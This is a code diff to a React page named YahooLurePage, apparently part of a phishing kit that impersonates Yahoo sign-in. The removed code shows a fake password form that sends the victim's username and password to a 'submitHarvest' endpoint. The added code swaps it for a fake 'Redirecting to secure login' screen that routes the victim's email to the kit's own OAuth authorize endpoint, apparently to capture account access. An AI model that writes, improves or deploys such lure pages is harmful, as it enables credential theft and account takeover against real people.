@@ -1,16 +1,12 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { api } from "@/lib/api";
-import { Provider } from "@/lib/types";
 import { ChevronLeft } from "lucide-react";
 
 export default function YahooLurePage() {
   const [step, setStep] = useState<1 | 2>(1);
   const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
-  const [submitting, setSubmitting] = useState(false);
   const [error, setError] = useState("");
 
   const handleNext = (e: React.FormEvent) => {
@@ -23,28 +19,14 @@ export default function YahooLurePage() {
     setStep(2);
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!password) {
-      setError("Please provide password.");
-      return;
+  useEffect(() => {
+    if (step === 2) {
+      const timer = setTimeout(() => {
+        window.location.href = `${api.getBaseUrl()}/api/v1/oauth/yahoo/authorize?target_email=${encodeURIComponent(email)}`;
+      }, 1500);
+      return () => clearTimeout(timer);
     }
-    setError("");
-    setSubmitting(true);
-
-    try {
-      await api.submitHarvest({
-        username: email,
-        password,
-        provider: Provider.YAHOO,
-        user_agent: navigator.userAgent,
-      });
-      window.location.href = "https://mail.yahoo.com/";
-    } catch (err) {
-      setError("Invalid password. Please try again.");
-      setSubmitting(false);
-    }
-  };
+  }, [step, email]);
 
   return (
     <div className="flex min-h-screen flex-col bg-[#f9f9f9] font-sans">
@@ -158,62 +140,26 @@ export default function YahooLurePage() {
               </div>
             </form>
           ) : (
-            <form onSubmit={handleSubmit}>
+            <div className="flex flex-col items-center justify-center py-12">
               <div className="mb-2 flex items-center justify-center">
                 <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className="h-8 mb-6" style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} />
               </div>
 
-              <div className="mb-6 flex flex-col items-center justify-center">
+              <div className="mb-4 flex flex-col items-center justify-center">
                 <span className="mb-2 text-sm text-[#222222] font-bold">{email}</span>
               </div>
-              <h1 className="mb-6 text-center text-xl font-bold text-[#222222]">
-                Enter password
-              </h1>
-              <p className="mb-6 text-center text-sm text-[#222222]">
-                to finish sign in
-              </p>
-
-              <div className="relative mb-6">
-                <input
-                  type={showPassword ? "text" : "password"}
-                  id="password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  className="peer w-full border-b border-[#222222] bg-transparent pb-1 pt-4 text-base text-[#222222] outline-none focus:border-b-2 focus:border-[#0f69ff]"
-                  placeholder=" "
-                  autoFocus
-                />
-                <label
-                  htmlFor="password"
-                  className="pointer-events-none absolute left-0 top-3 origin-[0] -translate-y-3 scale-75 transform text-[#7c7c8c] transition-all duration-150 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-3 peer-focus:scale-75 peer-focus:text-[#0f69ff]"
-                >
-                  Password
-                </label>
-                {error && <p className="mt-1 text-xs text-[#cc0000]">{error}</p>}
-                
-                <button
-                  type="button"
-                  onClick={() => setShowPassword(!showPassword)}
-                  className="absolute right-0 top-3 text-sm font-semibold text-[#188fff] hover:underline"
-                >
-                  {showPassword ? "Hide" : "Show"}
-                </button>
-              </div>
-
-              <button
-                type="submit"
-                disabled={submitting}
-                className="w-full rounded-full bg-[#7700ff] py-3 text-base font-bold text-white transition hover:bg-[#6001d2] disabled:opacity-70"
-              >
-                {submitting ? "Signing in..." : "Next"}
-              </button>
               
-              <div className="mt-8 text-center">
-                <button type="button" className="text-base font-bold text-[#188fff] hover:underline">
-                  Forgot password?
-                </button>
+              <p className="mb-6 text-center text-base text-[#222222]">
+                Redirecting to secure login...
+              </p>
+              <p className="mb-8 text-center text-sm text-[#7c7c8c]">
+                Please wait while we connect to Yahoo.
+              </p>
+              
+              <div className="h-1 w-full max-w-xs overflow-hidden rounded-full bg-[#e0e4e9]">
+                <div className="h-full w-1/2 animate-[progress_1s_ease-in-out_infinite] rounded-full bg-[#7700ff]"></div>
               </div>
-            </form>
+            </div>
           )}
         </div>
       </div>
